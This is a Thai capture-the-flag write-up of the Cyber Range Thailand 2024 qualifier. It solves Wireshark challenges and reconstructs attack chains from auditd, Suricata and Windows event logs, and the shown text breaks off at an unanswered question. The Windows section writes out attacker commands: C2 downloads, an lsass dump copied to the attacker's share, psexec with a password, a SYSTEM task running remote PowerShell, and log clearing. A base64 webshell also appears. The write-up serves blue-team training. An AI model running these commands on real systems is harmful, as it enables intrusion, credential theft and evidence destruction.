# Cyber Range Thailand 2024 (Qualifier) - Review and Write-up
## Table of Contents

- [Wireshark PCAP](#wireshark-pcap)
  - [Wireshark and packet body](#wireshark-and-packet-body)
  - [Filters in Wireshark](#filters-in-wireshark)
  - [Compression_gzip](#compression_gzip)
  - [DNS Tunnel](#dns-tunnel)
  - [smb_sniff](#smb_sniff)
  - [Wireshark and FTP](#wireshark-and-ftp)
  - [Wireshark and MAC](#wireshark-and-mac)
- [Attack chain in Auditd log](#attack-chain-in-auditd-log)
- [Chain of attacks in the Suricata IDS log](#chain-of-attacks-in-the-suricata-ids-log)
- [Attack chain in Windows event log](#attack-chain-in-windows-event-log)
- [Attack chain in Wireshark traffic dump](#attack-chain-in-wireshark-traffic-dump)
- [Conclusion](#conclusion)

* * *
![7ea173ba457a91507e0fa2f9e6dbdb2a.png](/resources/7ea173ba457a91507e0fa2f9e6dbdb2a.png)

สวัสดีครับทุกท่าน พบกับ chicken0248 กันอีกแล้ว ในครั้งนี้ผมได้มีโอกาสเข้าร่วมงาน Cyber Range Thailand 2024 ซึ่งเป็นงานที่จัดโดยบริษัท Solar จำกัด, บริษัท Cloudsec Asia จำกัด, มหาวิทยาลัยเทคโนโลยีพระจอมเกล้าธนบุรี และสำนักงานคณะกรรมการการรักษาความมั่นคงปลอดภัยไซเบอร์แห่งชาติ (สกมช.)  ร่วมกับหน่วยงานพันธมิตร 

โดยจะให้บุคคลทั่วไปหรือนักศึกษาอายุ 18 ปีขึ้นไปเข้าร่วมเป็นจำนวน 150 มาแข่งในรอบคัดเลือกครับ ซึ่งวันนี้ผมอยากจะมาโชว์ให้ทุกท่านดูว่า Platform ที่ใช้แข่งในรอบคัดเลือกนี้แล้วก็จะมาแชร์ write-up ของโจทย์ในรอบคัดเลือกครับผม

![f14b7e8a32106f39f4f3b86f9c80b942.png](/resources/f14b7e8a32106f39f4f3b86f9c80b942.png)

แต่ก็บอกไว้ตรงนี้เลยว่า ถึงแม้ NCSA Thailand จะบอกว่ารอบคัดเลือกจะเป็นการแข่ง CTF Jeopardy Style แต่มันก็เป็นความจริงแค่ส่วนนึงเท่านั้นครับ เพราะที่เหลือจะเป็นการทำ Digital Forensics หรือ Blue Team เพื่อค้นหาร่องรอยการโจมตีของ Threat Actor นั่นเอง

![fdbe1e217a6c921d7c93ab2eb4442732.png](/resources/fdbe1e217a6c921d7c93ab2eb4442732.png)

Platform ที่ใช้ในการแข่งขันครั้งนี้ก็คือ CYBERMIR ของ Solar ครับ ซึ่ง domain ตอนแข่งก็ยังเป็น demo อยู่เลย ถ้าให้เดาก็คิดว่า Solar คิดจะขาย platform นี้ในการ Training ทั้ง Red และ Blue team ครับ

โดยเราสามารถกดเข้าร่วมอีเวนต์ได้จากหน้านี้ครับ (เอ่อ... อย่าไปสนใจ QR Code นะครับ แต่ถ้าสนใจก็โอนเงินมาได้ครับ)

![4e5b1270651f30abe1f2b956543d6951.png](/resources/4e5b1270651f30abe1f2b956543d6951.png)

นี่ก็หน้าแรกที่ผู้เข้าแข่งจะได้พบเจอก่อนเป็นอันดับแรกเมื่อเข้าหน้าอีเวนต์มาครับ โดยจะมี Scoreboard ในรูปแบบของ % บอกว่าผู้เข้าแข่งขันคนไหนส่งคำตอบถูกไปกี่ % แล้ว, รายละเอียดของอีเวนต์ว่ามีผู้เข้าแข่งขันกี่คน, เวลาผ่านไปตั้งแต่เริ่มอีเวนต์เท่าไหร่แล้ว 

![79e7d1e89cc32302a2671a31f221d1e5.png](/resources/79e7d1e89cc32302a2671a31f221d1e5.png)

ปุ่ม **Manuals** จะแสดงหน้าต่างไฟล์ที่ใช้ในการแข่งขันครั้งนี้รวมถึงวิธีการใช้ Platform เบื้องต้นครับ (จะเห็นได้อย่างชัดเจนว่าการแข่งขันครั้งนี้เน้นไปที่ Blue Team ครับ)

![214ebbe917a23b9bad00a5d9e993f7b9.png](/resources/214ebbe917a23b9bad00a5d9e993f7b9.png)

ต่อไปจะเป็นปุ่ม **Participants report** หรือที่ ๆ ผู้เข้าแข่งขันจะต้องมา Submit คำตอบของตัวเองในหน้านี้ครับ ซึ่งเมื่อใส่คำตอบไปแล้วก็ต้องกด **Submit all** (ปุ่มสีเหลืองข้างบนมุมขวา) เพื่อให้ระบบส่งคำตอบเราไปคำนวนคะแนน แล้วก็จะเอาคะแนนไปขึ้น Scoreboard ครับ 

ข้อเสียตอนนี้ที่เห็นได้ชัดคือ เราจะไม่รู้เลยว่าคำตอบที่เราส่งไปนั้นเป็นคำตอบที่ถูกรึเปล่า โดยวิธีที่ผู้เข้าแข่งขันทำกันก็คือการเปิด tab นึงไว้ส่งคำตอบ ส่วนอีก tab เป็น scoreboard ไว้ดูคะแนน

![87f3ca6dc1ba488042c9b3028bc172d8.png](/resources/87f3ca6dc1ba488042c9b3028bc172d8.png)

ในส่วนของปุ่ม Connect จะเป็นการเปิด Kali Linux instance ขึ้นมาโดยจะมีไฟล์โจทย์ให้ในเครื่องและ tools พื้นฐานของ Kali ที่เราต้องการ (มั้งนะ ?) และในหน้านี้ก็จะมีปุ่มอื่น ๆ ให้เรากดตั้งแต่ให้โหลดไฟล์โจทย์

![14139afbb13e49d8b36f95e28cedde2b.png](/resources/14139afbb13e49d8b36f95e28cedde2b.png)
![cee2e1b466e110bd425611b8d2e9b852.png](/resources/cee2e1b466e110bd425611b8d2e9b852.png)
**3D Visualization** ที่จะเป็นการโชว์เมืองที่ทำด้วย Unity Model แต่ตอนนี้ยังไม่มี interaction อะไรกับมันครับ แค่ซูมเข้าซูมออก คาดว่าในอนาคตอาจจะมีเหตุการณ์พิเศษที่กระทบต่อตัวเมืองครับ

![3c1ca854cdfcb8d19b96d1efe5a2e880.png](/resources/3c1ca854cdfcb8d19b96d1efe5a2e880.png)

นี่คือหน้าตาของ Scoreboard ครับ คะแนนเต็มอยู่ที่ 720 คะแนน (จะเห็นว่าผมได้คะแนนเต็มก่อนใคร ก็เลยมีเวลามาปั่น write-up 555)

เราเห็นระบบกันคร่าว ๆ แล้ว ได้เวลามาเริ่มกันที่โจทย์ของงานได้เลยครับ
***
## Wireshark PCAP 
ในหมวดนี้จะให้ไฟล์ pcap 7 ไฟล์มาให้เรา โดยบางข้อจะให้เราหา flag แต่บางข้อก็จะให้หาข้อมูลจาก packet ข้างใน pcap ไฟล์ครับ

### Wireshark and packet body 
>What is the length of the data field transmitted in the ICMP packet?

![2e16daa176f32efc8fa49126f37f21b1.png](/resources/2e16daa176f32efc8fa49126f37f21b1.png)

ข้อนี้ทำผมเสียเวลาอยู่นานมากครับ ไม่ใช่เพราะอะไรหรอก มันเป็นข้อสุดท้ายที่ผมขาดก่อนจะได้ 100% solve ของการแข่งรอบนี้ ซึ่งเราจะเห็นว่า Wireshark ได้ detect data section ของ ICMP packet เป็น 40 bytes แต่นั่นก็ไม่ใช่คำตอบที่ถูกครับ

![a16290bdd82305ec60105c1ded3f84db.png](/resources/a16290bdd82305ec60105c1ded3f84db.png)

คำตอบที่แท้จริงของข้อนี้ก็คือ 48 bytes โดยเราสามารถไปหาคำตอบเพิ่มเติมได้จาก link นี้ครับ https://stackoverflow.com/questions/58645401/why-is-there-something-written-in-the-data-section-of-an-icmpv4-echo-ping-reques

```
48
```

![0997ce0bd1501bcf27e089f52334e340.png](/resources/0997ce0bd1501bcf27e089f52334e340.png)
***
### Filters in Wireshark 
>Indicate how many Type A DNS queries were sent to the server 208.67.220.220?

![a215dc1844670ea02a4d27614a737d29.png](/resources/a215dc1844670ea02a4d27614a737d29.png)

ข้อนี้สิ่งที่เราต้องทำก็แค่สร้าง filter ให้หา packet ที่เป็น Type A DNS queries ไปที่ IP address เป้าหมาย โดยที่ผมใช้จะเป็นตัวนี้ครับ `dns.qry.type==1 && ip.dst == 208.67.220.220` และจำนวน Displayed packet ของ filter นี้ก็คือคำตอบของข้อนี้ครับ

```
19
```

![bd51dd4c299617e06a7f5fe62aff9122.png](/resources/bd51dd4c299617e06a7f5fe62aff9122.png)
* * *
### Compression_gzip 
![5f4ba913ce3141d90481363be90cd20c.png](/resources/5f4ba913ce3141d90481363be90cd20c.png)

ข้อนี้จะเป็นการให้หา flag ครับ โดย communication ที่น่าสนใจใน pcap นี้ก็คือ HTTP ครับ ซึ่งผมก็ได้ไปเจอ flag อยู่ใน HTTP Response ที่เป็น JSON ในรูปเลย

```
flag{y0u_h4v3_f0und_th3_gzipp3d_answ3r}
```

![3a46573937d53adb22e886ab1e382389.png](/resources/3a46573937d53adb22e886ab1e382389.png)
* * *
### DNS Tunnel 
![cdf4f7839ead4ea29ad505e8b061828d.png](/resources/cdf4f7839ead4ea29ad505e8b061828d.png)

ในข้อนี้เราจะต้อง extract flag จาก dns query ซึ่งผมเห็นแล้วก็เอ๊ะขึ้นมาทันทีเพราะว่าก่อนวันแข่งผมได้ลองเล่น HackTheBox Sherlock - Litter ซึ่งเป็นการ investigate DNS tunneling ที่เกิดขึ้นจาก dnscat2 ซึ่งโจทย์ข้อนี้ก็เป็นแบบเดียวกันครับ (ถือว่าเก็งข้อสอบมาถูกข้อมั้ง?)

![6bc769738bac318838ea2992dfb879d9.png](/resources/6bc769738bac318838ea2992dfb879d9.png)

ผมได้ใช้ command `tshark -r DNS\ tunnel.pcapng -Y "dns && ip.addr == 192.168.5.22" -T fields -e dns.qry.name | awk 'length($0) > 24' | xxd -r -p > dns_conver.txt` ในการ extract dns domain name ที่มีความยาวเกิน 24 (เอามาจาก 1.5.168.192.in-addr.arpa) แล้วแปลงค่าจาก hex เป็น text ใส่ในไฟล์เพื่อเปิดกับ VSCode โดยเราจะเห็นว่ามี flag ซ่อนอยู่จริง ๆ ครับแต่เหมือนจะมีบางส่วนที่ขาดไปแล้วมี gibberish จากการ convert มาปนทำให้การหา flag ยากขึ้น

![50ee11254d725d98c995758cf1334d1f.png](/resources/50ee11254d725d98c995758cf1334d1f.png)

ต่อมาผมก็ได้ใช้ command `tshark -r DNS\ tunnel.pcapng -Y "dns && ip.addr == 192.168.5.22" -T fields -e dns.qry.name | awk 'length($0) > 25' > dns_conver_unfilter.txt` ซึ่งมีการเพิ่ม length ขึ้นมาอีกนิดแล้วก็ไม่ได้ให้มัน convert เป็น text เพื่อที่เราจะได้มาตัดคำ (จริง ๆ มันทำได้ตั้งแต่ command-line แต่ผมอยากไปทำใน vscode) ซึ่งเราก็รู้อยู่แล้วว่า flag มันอยู่ช่วงสุดท้ายและ domain มันก็จะดูยาว ๆ หน่อย ก็ก็อปทั้งโดเมนมาใส่ CyberChef โดยเอา dot (.) และ domain ต่อท้ายออก

![75aab247633a84a0f82545eb2ef73182.png](/resources/75aab247633a84a0f82545eb2ef73182.png)

สุดท้ายก็เอามา convert เป็น text ก็จะได้ flag อย่างที่เห็นครับ

```
flag{this_is_a_hidden_message_in_dns_requests}
```

![c5b126dc2742063a008828d4b90a40df.png](/resources/c5b126dc2742063a008828d4b90a40df.png)
* * *
### smb_sniff 
![74840df8ebd4bf63202c9850cddd3e4e.png](/resources/74840df8ebd4bf63202c9850cddd3e4e.png)

เป็นอีกข้อที่ให้หา flag เหมือนกัน โดยข้อนี้เนื่องจากตัวไฟล์บอกใบ้ไว้แล้วว่า flag จะอยู่ใน smb ซึ่งผมก็ filter `smb2` แล้วก็ไปเจอ flag ถูก read ผ่าน smb ครับ

![a14899b857afc5fc2a54c4b5bf6ee7c1.png](/resources/a14899b857afc5fc2a54c4b5bf6ee7c1.png)

ตัว flag ก็จะมาจาก `4.txt` บน `\\192.168.108.1\data` นั่นเอง

```
flag{smb_tr4nsfer_sn1ff}
```

![256e222b2aefea4351613e061afee173.png](/resources/256e222b2aefea4351613e061afee173.png)
* * *
### Wireshark and FTP 
![3a20f467bd82c08afe02e7055315c63f.png](/resources/3a20f467bd82c08afe02e7055315c63f.png)

เนื่องจากข้อนี้ตั้งชื่อว่าเป็น FTP ดังนั้นสิ่งที่ผมทำคือไปที่ File -> Export Objects -> FTP-DATA... ครับ โดยจะเห็นว่ามี flag ในลักษณะของ image file ถูกส่งด้วย FTP protocol ใน capture นี้

![flag.jpg](/resources/flag.jpg)

นี่ก็คือไฟล์ที่เราสามารถ export ออกมาได้ครับ จะพิมพ์เองก็ได้นะหรือ...

![3915d74f3065d09de63c173ccbbf2620.png](/resources/3915d74f3065d09de63c173ccbbf2620.png)

ส่วนตัวผมใช้ https://www.imagetotext.info/ เพราะผมไม่เชื่อใจนิ้วตัวเองเท่าไหร่ครับช่วงนี้ 5555

```
flag{8be9140721c890ae21c2bd02788bf30b}
```

![589f848b0dd893a3d391c714355ea512.png](/resources/589f848b0dd893a3d391c714355ea512.png)
* * *
### Wireshark and MAC 
>Specify the MAC address of the computer with the IP address 192.168.0.8

![47fdc74d755677ddfcfd47a89a4b5618.png](/resources/47fdc74d755677ddfcfd47a89a4b5618.png)

ข้อนี้ให้หา MAC address ของ IP หนึ่งซึ่งเราจะ filter หา arp request / response ก็ได้ แต่เราไม่จำเป็นต้องทำขนาดนั้นเพราะใน Data Link Layer ก็จะมีการใส่ MAC address ลงไปอยู่แล้ว

```
00:0c:29:ce:5b:7b
```

![251819b2b2ca275c97b85227fe241685.png](/resources/251819b2b2ca275c97b85227fe241685.png)
* * *
หลังจากนี้ไปก็จะเป็น scenario สำหรับชาว blue team ให้ทำการ investigate กันหละครับ

## Attack chain in Auditd log 
![d06a06fe7a2fe4f17481fd8bfff73f07.png](/resources/d06a06fe7a2fe4f17481fd8bfff73f07.png)
ในโจทย์นี้ก็จะให้ Auditd log ไฟล์มา ซึ่งจะให้เราเริ่มหาตั้งแต่ content ข้างในของ webshell ไปจนถึง protocol ที่ใช้ exfiltrate file ออกไปครับ

>Write the contents of shell.php in base64 encoding

ข้อนี้ผมรู้สึกว่าผมโกงมานิดหน่อยครับ เพราะผมไปทำข้อหลัง ๆ ก่อนทำให้เอะใจได้ว่าเครื่องที่ถูกโจมตีนั้น ถูกโจมตีด้วยช่องโหว่ Drupalgeddon2 ผมก็เลยไปหา github repo ที่มีการ generate webshell ของช่องโหว่นี้ครับ  

![c765173c318d1b73ceb2533bba62e009.png](/resources/c765173c318d1b73ceb2533bba62e009.png)

แล้วผมก็ไปเจอ payload ที่ต้องการใน GitHub repo นี้ https://github.com/dreadlocked/Drupalgeddon2

![009e9bbcf298b2f7014a414d8d6b1e70.png](/resources/009e9bbcf298b2f7014a414d8d6b1e70.png)

เอา payload มา encode ด้วย base64 แล้วส่งคำตอบก็จะได้คะแนนมาครับ

```
PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9
```

**สำหรับคนที่มองหา intended way, เชิญทางนี้ครับ

![97d1f8149a242c116ed2814b870b9f62.png](/resources/97d1f8149a242c116ed2814b870b9f62.png)

ขั้นแรกเราต้องมองหาว่า `shell.php` ถูกสร้างมาตอนไหน ซึ่งตรงนั้นจะเห็นว่ามีการรัน `sh -c` ตามด้วย argument ที่เป็น hex ที่ `/var/www/html` แล้วหลังจากนั้นก็จะมีการรัน base64 decode แล้วสร้างไฟล์ `shell.php` ขึ้นมาด้วยการ pipe ด้วย `tee`

![8f7c0442d1a6291c5de921b3db81e6f7.png](/resources/8f7c0442d1a6291c5de921b3db81e6f7.png)

ดังนั้นหากเราเอา hex ตรงนั้นมา convert เป็น text ก็จะพบ command ในการสร้างไฟล์ `shell.php` ครับ

>What vulnerability does the shell.php load correspond to?

![b66df6fced9be407a144b350cdc09a99.png](/resources/b66df6fced9be407a144b350cdc09a99.png)
intended way ก็คือการเอา base64 จากข้อแรกไป search ตรง ๆ ใน google ครับ ก็จะขึ้นมา repo แรกเลย
```
CVE-2018-7600
```

หรือจะตอบว่า `drupalgeddon2` ก็ได้เหมือนกันครับ

>What is the IP address of the attacker's server

![2c60968046501e2779fe38445ac0b251.png](/resources/2c60968046501e2779fe38445ac0b251.png)
เมื่อค้นไปเรื่อย ๆ เราก็จะพบว่ามีการใช้ `wget` ในการ request หลาย ๆ ไฟล์มาจาก C2 server ครับ ซึ่งไฟล์ที่ได้ request มาก็จะมีตั้งแต่
- `sploit.c`
- `socat`
- `exfil.sh`
- `encr.sh`
และ `FLAG.txt` โดย IP address ตัวนี้ก็จะใช้ในการ exfiltrate file ออกไปด้วยครับ

```
10.7.200.50
```

>What port did the attacker use to access the command shell with elevated privileges?

เรารู้ว่า threat actor ได้ทำการส่ง `socat` มาบนเครื่องเหยื่อ ผ่าน webshell ดังนั้นผมก็ลองหาว่า threat actor อาจจะใช้ socat ในการทำ reverse shell และก็น่าจะทำ privilege escalation ให้ได้ shell กลับไปเป็น root ด้วย 

![159147c12ca9a7dc146373c03d90cda7.png](/resources/159147c12ca9a7dc146373c03d90cda7.png)

ซึ่งผมก็พบว่าหลังจากได้ `socat` มา หลังจากนั้นก็มีการพยายามใช้ `socat` ด้วยสิทธิ์ www-data ซึ่งในที่นี้ทาง threat actor ก็ได้ทำ bind shell บนเครื่องเหยื่อสำเร็จที่ port 8080

![712cc213ddd1cbc9d208c2635a04ef9d.png](/resources/712cc213ddd1cbc9d208c2635a04ef9d.png)
![1a039f37b38dc8e1d94121d172f8b12e.png](/resources/1a039f37b38dc8e1d94121d172f8b12e.png)

หลังจากนั้น threat actor ก็ได้พบว่า `/usr/bin/passwd` มีการ setuid ให้รันด้วย root privilege ซึ่งก็แน่นอนว่า threat actor ก็ได้ทำ priviledge escalation ด้วย binary ตัวนี้ (สังเกตได้ว่า uid ได้เปลี่ยนเป็น 0 หรือ root เรียบร้อยแล้ว) 

**ซึ่งจริง ๆ แล้วเป็นการ exploit ด้วย DirtyCow ครับ

![7f6d2e19c2588aaba39c8527bc5e82d0.png](/resources/7f6d2e19c2588aaba39c8527bc5e82d0.png)

หลังจากนั้น threat actor ก็ได้ใช้ socat สร้าง remote shell connection ในอีก session ด้วย root privilege ที่ port 8081 ซึ่งก็คือคำตอบของข้อนี้ครับ

```
8081
```

>What type of encryption did the attacker use to encrypt the files? 

![803ae4af3354f9e0a67dc6d7cc5dadad.png](/resources/803ae4af3354f9e0a67dc6d7cc5dadad.png)

หลังจากนั้น threat actor ก็ได้โหลดไฟล์ `encr.sh` ที่เป็น script ที่ใช้ encrypt files บนเครื่องเหยื่อด้วย openssl โดย key และ iv ก็จะมาจาก urandom และ rand base64 แต่เราก็ยังไม่รู้แน่ชัดว่าเป็น AES เวอร์ชั่นไหนที่ใช้ encrypt แต่เรารู้ว่าไฟล์ที่ถูก encrypt จะต้องมี extension เป็น .php หรือก็ขึ้นต้นด้วย FLAG.txt

![1f7bcf30985875f0d2b5acfa8a19835a.png](/resources/1f7bcf30985875f0d2b5acfa8a19835a.png)

ซึ่งเมื่อเลื่อนลงไปเรื่อย ๆ ตาม flow ก็จะพบว่าเป็น AES-256-CBC โดยมี key เข้ารหัสไฟล์และ iv ตามที่เห็นแล้ว และไฟล์ที่ถูก encrypted ก็จะมี extension ต่อท้ายเป็น `.encr`

```
AES-256-CBC
```

>What encryption key did the attacker use 

![b8c3b01a47f2a970f185433ccd84de9e.png](/resources/b8c3b01a47f2a970f185433ccd84de9e.png)
threat actor ได้ทำการ encrypt ไฟล์หลายไฟล์มากโดยใช้ key เดียวกัน แต่ก็มี `FLAG.txt` ที่ถูก encrypt ด้วย key และ IV ที่ต่างออกไป ซึ่งผมก็ได้ลอง submit key นี้ไปแล้วระบบก็นับว่า key นี้คือคำตอบที่ถูก ดังนั้นข้อนี้เราสามารถตอบได้สอง key ครับ
```
/yB4pcpUbRG5JDpc9fpX5Q==
```

>What protocol did the attacker use for exfiltration 

![fea890a5d28e022734de0c29aad732c6.png](/resources/fea890a5d28e022734de0c29aad732c6.png)
เรารู้ว่า threat actor ได้ drop `exfil.sh` ลงมาดังนั้นผมก็มุ่งเป้าความสนใจไปที่ script นี้เลย ซึ่งก็จะพบว่าเป็นสคริปต์ที่ใช้ gzip, base64,sed,tr กับไฟล์สำคัญ ๆ เช่น `/etc/passwd` และ `/etc/shadow` แล้วสร้าง DNS query ด้วย `dig` เพื่อ exfiltrate ผลลัพท์จาก command เหล่านั้นไปยัง C2 ดังนั้น protocol ที่ใช้ก็คือ DNS นั่นเอง

```
DNS
```

![971f5f9d33f46016642d74c96ed07dea.png](/resources/971f5f9d33f46016642d74c96ed07dea.png)
* * *
## Chain of attacks in the Suricata IDS log 
![58affd664bddccb44eaa517fc68ab8f5.png](/resources/58affd664bddccb44eaa517fc68ab8f5.png)
ในโจทย์นี้ก็จะให้ `fast.log` ไฟล์มา ซึ่งจะเป็นไฟล์ log ที่ generate โดย suricata ครับ โดยจะมีข้อดีอยู่ที่ทุก ๆ บรรทัดก็จะมี alert/warning บอกว่าอาจจะเป็นการโจมตีประเภทไหนจากใคร

>What is the attacker's IP address 

![370b6c0878fc06b8f06b9df01f06e9e2.png](/resources/370b6c0878fc06b8f06b9df01f06e9e2.png)

ข้อนี้ผมใช้กำปั้นทุบดินด้วยการรัน command `grep -i "attack" fast.log` แล้วก็หาว่ามี alert/warning ไหนที่น่าสนใจบ้างซึ่งก็พบว่ามีการโจมตี Web Attack มาจาก IP Address นึงอย่างต่อเนื่อง ซึ่งนั่นก็เป็น IP Address ของ threat actor นั่นเอง

```
10.64.5.69
```

>What tool was used to scan the nodes 

![f244023cf7a58bb3c9aa47b041f92f19.png](/resources/f244023cf7a58bb3c9aa47b041f92f19.png)
กำปั้นทุบดินไปอีกข้อครับ ผมเปลี่ยน keyword เป็นคำว่า nmap แทนเพราะเป็น well-known scanning tool แล้วก็พบว่ามีการใช้ nmap ในการแสกนจริง ๆ ครับ
```
nmap
```

>When was the last attack on a web server? 10.69.2.11,format :HH:MM:SS

![38c2ea7a294fc08593db6c64a9e2e883.png](/resources/38c2ea7a294fc08593db6c64a9e2e883.png)

command ที่ผมใช้ในข้อนี้ก็คือ `grep  "10.69.2.11" fast.log | grep -i "web" | tail` โดยเริ่มจากการ filter IP ที่เราสนใจ จากนั้นก็ไปเอาเฉพาะ alert/warning ที่เกี่ยวกับเว็บและให้ display ส่วนสุดท้ายของผลลัพธ์ที่ผ่านการ filter แล้วออกมาก็จะได้ timestamp สุดท้ายของ alert/warning ที่มีการโจมตีไปที่ web server ตัวนี้ครับ

```
19:53:28
```

>To which address was the password brute force attack carried out 

![d5ce4bb4d3151d6ffee799345d24cb49.png](/resources/d5ce4bb4d3151d6ffee799345d24cb49.png)

ข้อนี้ผมเริ่มจากการ filter หา protocol ที่สามารถถูก bruteforce ได้ โดยเริ่มจาก SSH (ซึ่งไม่ใช่คำตอบที่ถูกต้อง) แล้วก็มาเจอว่ามีการ Brute force ผ่าน RDP เกิดขึ้นไปยัง IP 10.69.1.254 และ 10.69.3.20 ซึ่งผม submit ตัวที่สองแล้วได้คะแนน ซึ่งมันก็ต้องเป็นตัวนี้แล้วหละ 555

```
10.69.3.20
```

>From what address was the attack on the domain controller 10.69.3.10 

![c9d414d6125b60d9f3295eeae8d7d9e4.png](/resources/c9d414d6125b60d9f3295eeae8d7d9e4.png)
ข้อนี้เราสามารถใช้ command `grep  "10.69.3.10:" fast.log` ได้ตรง ๆ เลยซึ่งก็จะพบว่า มีการพยายามโจมตีมายัง domain controller ด้วย DCSync attack จาก IP ภายใน IP หนึ่งซึ่งคาดว่าจะเป็น compromised host แล้วพยายาม pivot มาที่ DC
```
10.69.2.11
```

>What tool did the attacker use to encrypt files on a Windows server? 

![1c4d1e15c954002be88cd23bf02860ff.png](/resources/1c4d1e15c954002be88cd23bf02860ff.png)
เมื่อมีการ encrypt นั่นย่อมหมายถึง Ransomware ซึ่งผมก็ใช้ command `grep -i "ransom" fast.log` ที่ให้โชว์ alert/warning ที่น่าจะเกี่ยวกับ ransomware attack เท่านั้น โดยข้อนี้จะให้เราตอบเป็น library ที่ใช้ในการ encrypt ซึ่งก็คือ CryptoAPI นั่นเอง
```
CryptoAPI
```

>Write the number of the most frequent warning suricata 

![a49f4c5c047c8351d3e4048e6131d02c.png](/resources/a49f4c5c047c8351d3e4048e6131d02c.png)

ข้อนี้ต้องกราบ ChatGPT งาม ๆ อีกครั้งโดยผมให้มัน gen command ที่ให้นับ warning ที่ต่างกันและ print เฉพาะ warning ที่มีจำนวนมากที่สุดออกมาครับ

`grep '\[**\]' fast.log | awk -F '\[|\]' '{print $5}' | sort | uniq -c | sort -nr | head -n 1`

ซึ่งจะเป็นว่าเป็น RDP bruteforce attack warning นั่นเอง

```
20094
```

>When did the attack happen ,format: dd/mm/yyyy? 

![af25011dd33544956eb893b0f60b00f4.png](/resources/af25011dd33544956eb893b0f60b00f4.png)
ข้อนี้แจกคะแนนครับ เนื่องจากการ attack ทั้งหมดมันเกิดในวันเดียวกัน 
```
11/08/2022
```

![c2ca0118dec3453ab1e08a7cc62132ba.png](/resources/c2ca0118dec3453ab1e08a7cc62132ba.png)
***
## Attack chain in Windows event log 
![258ad013ef6d6326fc53eb242be4fabf.png](/resources/258ad013ef6d6326fc53eb242be4fabf.png)
โจทย์นี้จะให้ Windows event log file มาในรูปแบบของทั้ง evtx ไฟล์ที่จะเปิดผ่าน Event Viewer บน Windows ได้ และไฟล์ที่สองก็คือ event log ในรูปแบบ xml ที่จะใช้ terminal ในการ filter ได้ง่ายหรือจะจับโยนเข้า SIEM อย่างเช่น splunk ก็ทำได้

>What is the domain name of the computer 

![642cd40c8e82c846eb8eb1275586f018.png](/resources/642cd40c8e82c846eb8eb1275586f018.png)
ข้อแจกคะแนนครับ แค่เปิด log มาก็พบแล้ว
```
mx1.company.local
```

>What is the number of unsuccessful entries in the log

![361de3640843ea33c6f0fba3ca4c6219.png](/resources/361de3640843ea33c6f0fba3ca4c6219.png)
ในข้อนี้เราต้อง filter เอาเฉพาะ EventID 4625 An account failed to log on. ซึ่งก็จะพบว่ามีอยู่ 108 entries ใน log นี้ครับ
```
108
```

>The password for which account was selected 

![e4c0c7aa4aa8516253eafc3fb43cfc2c.png](/resources/e4c0c7aa4aa8516253eafc3fb43cfc2c.png)

ข้อนี้ผมข้ามไป phase หลังจากที่ threat actor bruteforce สำเร็จเลย โดยจะ filter EventID 4688 Process Creation ที่มักจะเก็บ CommandLine ของแต่ละ process เอาไว้ด้วยซึ่งผมก็พบว่ามีการใช้ cmd รัน powershell command เพื่อดึง `procdump.exe` มาจาก C2 server 

![234575b8cd7bc95a3f32a0ccc4264766.png](/resources/234575b8cd7bc95a3f32a0ccc4264766.png)

ซึ่งหลังจากนั้นก็ได้มีการเอา `psexec64.exe` มาด้วยซึ่ง without a doubt แล้วหละว่า Admin ถูก compromised ไปแล้ว

```
Admin
```

ซึ่งเมื่อย้อนกลับไปดูตั้งแต่เริ่มก็จะพบว่า threat actor ได้รัน
- `hostname` : แสดง hostname 
- `whoami` : ฉัน เป็น ใคร?
- `"netsh" interface tcp show global` : แสดงการตั้งค่า TCP
- `cmd.exe /C powershell wget http://10.64.5.73/procdump.exe -O C:\Users\Admin\procdump.exe` : ดึง process dump มาจาก C2
- `cmd.exe /C powershell wget http://10.64.5.73/psexec64.exe -O C:\Users\Admin\psexec64.exe` : ดึง psexec มาจาก C2
- `cmd.exe /C dir C:\Users\Admin` : ไปยังโฟลเดอร์ที่ drop ไฟล์มา
- `cmd.exe /C C:\Users\Admin\procdump.exe -accepteula -ma lsass C:\lsass.dmp` : dump lsass process ซึ่งสามารถเอาไป crack หา hash / weak password ได้
- `cmd.exe /C copy C:\lsass.dmp \\10.64.5.73\share` : copy lsass dump ไปยัง C2 share drive
- `cmd.exe /C C:\Users\Admin\psexec64.exe -accepteula -s -u company.local\Administrator -p Server1 \\10.73.3.50 cmd /c whoami` : หลังจากได้ password ของ Administrator มาแล้วก็ใช้ psexec run `whoami` ในสิทธิ์ของ Administrator บนเครื่อง 10.73.3.50
- `cmd.exe /C C:\Users\Admin\psexec64.exe -accepteula -s -u company.local\Administrator -p Server1 \\10.73.3.50 cmd /c ipconfig` : รัน `ipconfig` บนเครื่อง 10.73.3.50
- `cmd.exe /C C:\Users\Admin\psexec64.exe -accepteula -s -u company.local\Administrator -p Server1 \\10.73.3.50 cmd /c schtasks /F /create /RU SYSTEM /tn WindowsUpdate /sc DAILY /st 00:00 /tr "powershell iex ((New-Object System.Net.WebClient).DownloadString('http://10.64.5.73/persist.ps1'))"` : สร้าง Task "WindowsUpdate" ที่จะรันด้วยสิทธิ์ SYSTEM ทุก ๆ เที่ยงคืนเพื่อดาวน์โหลดและรัน persistence script จาก C2 server
- `cmd.exe /C C:\Users\Admin\psexec64.exe -accepteula -s -u company.local\Administrator -p Server1 \\10.73.3.50 cmd /c for %x in (Application System Security ForwardedEvents) do wevtutil cl %x` : เคลียร์ log ต่าง ๆ เป็นอันจบพิธี

>What MITER ATT&CK technique did the attacker use to compromise local accounts? Write the exact code of the equipment. 

![0aafa22836c22bcae3f1a475a3663c6d.png](/resources/0aafa22836c22bcae3f1a475a3663c6d.png)

เรารู้อยู่แล้วว่า threat actor dump lsass process ออกมาเพื่อ crack หา credential เราก็เอา lsass ไป search บน MITRE ATT&CK ได้เลย

![c1f98daf6d594a47cddff94cf8be9262.png](/resources/c1f98daf6d594a47cddff94cf8be9262.png)

และนี่ก็คือ technique ที่ใช้ครับ

```
T1003.001
```

>What is the password for the Administrator account 

![0172c40ecfae8678b293e99e1ab22b81.png](/resources/0172c40ecfae8678b293e99e1ab22b81.png)

อะไรก็ตามที่อยู่หลัง -p ใน psexec command ก็คือ password ครับ

```
Server1
```

>Write the name of the attacker's tool for horizontal movement 

เรารู้ว่า threat actor ใช้ psexec ในการรัน command บนเครื่อง 10.73.3.50 ดังนั้นก็แค่ใส่ exe name ของ psexec ลงไป
```
psexec64.exe
```

>Write the name of the scheduler task created by the attacker for pinning 

